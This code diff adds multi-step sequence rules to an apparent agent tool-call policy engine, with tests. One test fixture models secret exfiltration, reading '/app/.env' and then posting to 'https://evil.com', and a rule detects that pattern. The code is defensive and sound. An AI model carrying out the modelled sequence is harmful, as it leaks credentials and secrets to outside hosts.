@@ -22,6 +22,8 @@ pub struct CompiledPolicy {
     pub spend_caps: Option<super::schema::SpendCapsConfig>,
     /// LLM API governance configuration
     pub llm: Option<super::schema::LlmConfig>,
+    /// ADR stateful sequence rules (v2.1)
+    pub sequence_rules: Vec<CompiledSequenceRule>,
 }
 
 impl std::fmt::Debug for CompiledPolicy {
@@ -42,6 +44,7 @@ impl std::fmt::Debug for CompiledPolicy {
             .field("firewall", &self.firewall)
             .field("spend_caps", &self.spend_caps)
             .field("llm", &self.llm)
+            .field("sequence_rules", &self.sequence_rules)
             .finish()
     }
 }
@@ -502,4 +505,124 @@ impl CompiledPolicy {
 
         EvalResult::Allow { matched_group_id }
     }
+
+    /// Evaluate multi-step sequence rules against the session sliding window (<1ms)
+    pub fn evaluate_sequence(
+        &self,
+        consequent_tool: &str,
+        _params: &Value,
+        tracker: &crate::proxy::session::SlidingWindowTracker,
+    ) -> EvalResult {
+        for rule in &self.sequence_rules {
+            if rule.consequent_tools.iter().any(|t| t == consequent_tool || t == "*") {
+                let has_antecedent = tracker.contains_any_tool_matching_param(
+                    &rule.antecedent_tools,
+                    rule.antecedent_param_regex.as_ref().map(|r| r.as_str()),
+                );
+                if has_antecedent {
+                    return EvalResult::Deny {
+                        reason_code: "SEQUENCE_VIOLATION".to_string(),
+                        param_name: None,
+                        param_value: Some(consequent_tool.to_string()),
+                        pattern: rule.antecedent_param_regex.as_ref().map(|r| r.to_string()),
+                        json_pointer: None,
+                        validator_name: Some(format!("sequence_rule:{}", rule.name)),
+                        matched_group_id: None,
+                    };
+                }
+            }
+        }
+        EvalResult::Allow { matched_group_id: None }
+    }
+
+    /// Helper for tests to parse policy YAML string into CompiledPolicy
+    pub fn from_yaml_str(yaml_str: &str) -> Result<Self, String> {
+        let temp_dir = std::env::temp_dir();
+        let file_path = temp_dir.join(format!("test_policy_{}.yaml", uuid::Uuid::new_v4()));
+        std::fs::write(&file_path, yaml_str).map_err(|e| e.to_string())?;
+        let res = crate::policy::loader::load_policy(&file_path, None);
+        let _ = std::fs::remove_file(&file_path);
+        match res {
+            crate::policy::loader::PolicyLoadResult::Loaded { policy, .. } => Ok(policy),
+            crate::policy::loader::PolicyLoadResult::Degraded { reason } => Err(reason),
+            crate::policy::loader::PolicyLoadResult::Fatal { error } => Err(error.to_string()),
+        }
+    }
 }
+
+/// A compiled stateful multi-step sequence rule (Schema v2.1)
+#[derive(Clone, Debug)]
+pub struct CompiledSequenceRule {
+    pub name: String,
+    pub window_size: usize,
+    pub antecedent_tools: Vec<String>,
+    pub antecedent_param_regex: Option<Regex>,
+    pub consequent_tools: Vec<String>,
+    pub action: String, // "block", "deny", "warn"
+    pub message: String,
+}
+
+#[cfg(test)]
+mod sequence_engine_tests {
+    use super::*;
+    use crate::proxy::session::{SlidingWindowTracker, ToolCallFingerprint};
+
+    #[test]
+    fn test_sequence_engine_blocks_sensitive_read_followed_by_exfiltration() {
+        let yaml = r#"
+version: "2.1"
+default_action: deny
+tools:
+  - name: read_file
+    action: allow
+  - name: http_post
+    action: allow
+sequence_rules:
+  - name: block_env_exfiltration
+    window_size: 5
+    antecedent_tools: ["read_file"]
+    antecedent_param_regex: ".*\\.env.*"
+    consequent_tools: ["http_post"]
+    action: block
+"#;
+        let policy = CompiledPolicy::from_yaml_str(yaml).unwrap();
+        let mut tracker = SlidingWindowTracker::new(5);
+
+        // Step 1: Read sensitive file
+        tracker.push(ToolCallFingerprint::new("read_file", &serde_json::json!({"path": "/app/.env"})));
+
+        // Step 2: Attempt http_post
+        let eval = policy.evaluate_sequence("http_post", &serde_json::json!({"url": "https://evil.com"}), &tracker);
+        assert!(matches!(eval, EvalResult::Deny { .. }));
+    }
+
+    #[test]
+    fn test_sequence_engine_allows_normal_http_post_without_antecedent() {
+        let yaml = r#"
+version: "2.1"
+default_action: deny
+tools:
+  - name: read_file
+    action: allow
+  - name: http_post
+    action: allow
+sequence_rules:
+  - name: block_env_exfiltration
+    window_size: 5
+    antecedent_tools: ["read_file"]
+    antecedent_param_regex: ".*\\.env.*"
+    consequent_tools: ["http_post"]
+    action: block
+"#;
+        let policy = CompiledPolicy::from_yaml_str(yaml).unwrap();
+        let mut tracker = SlidingWindowTracker::new(5);
+
+        // Step 1: Read normal file
+        tracker.push(ToolCallFingerprint::new("read_file", &serde_json::json!({"path": "/app/README.md"})));
+
+        // Step 2: Attempt http_post
+        let eval = policy.evaluate_sequence("http_post", &serde_json::json!({"url": "https://api.github.com"}), &tracker);
+        assert!(matches!(eval, EvalResult::Allow { .. }));
+    }
+}
+
